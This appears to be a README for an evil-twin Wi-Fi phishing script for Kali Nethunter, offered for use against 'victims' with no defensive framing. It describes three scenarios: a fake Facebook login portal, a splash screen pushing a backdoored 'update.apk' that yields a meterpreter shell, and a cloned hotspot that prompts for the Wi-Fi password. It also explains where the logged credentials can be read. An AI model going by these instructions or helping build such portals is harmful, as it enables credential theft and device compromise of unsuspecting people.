I made this basic script and tested it on Kali Nethunter.<br />
You don't need a second wireless interface or monitor mode. wlan0 is enough. <br />
**Note 1:**
You need 3G/LTE connection enabled, even if your data is 0 megabytes. <br />
# 1. **Scenario 1: facebook phishing**
<img src="images/Screenshot_2023-06-15-20-30-56-352_com.google.android.captiveportallogin.jpg" width="100">

# 2. **Scenario 2: fake plugin update with android APK**
<img src="images/backdoor.jpg" width="100">
    Create an android payload (update.apk). <br />
When the victim connects to the fake hotspot, he will get a splash screen asking him to download a necessary plugin update (update.apk) <br />
If he installs the apk, you'll get a meterpreter shell. <br />

# 3. **Scenario 3: Wifi Password Pop up**

<img src="images/wifi.jpg" width="200">
In this scenario, you can name your hotspot the same name as any wifi network around you, and if the victim connects to it by mistake, he's greeted with a pop up login box that asks for the wifi password.<br />

You can access the logged credentials in the browser. Just type your wlan0 ip:8080/logger.html<br />
**http://192.168.43.1:8080/logger.html** <br />

**Feel free to improve the script by modifying the code or providing other fake portals**
          
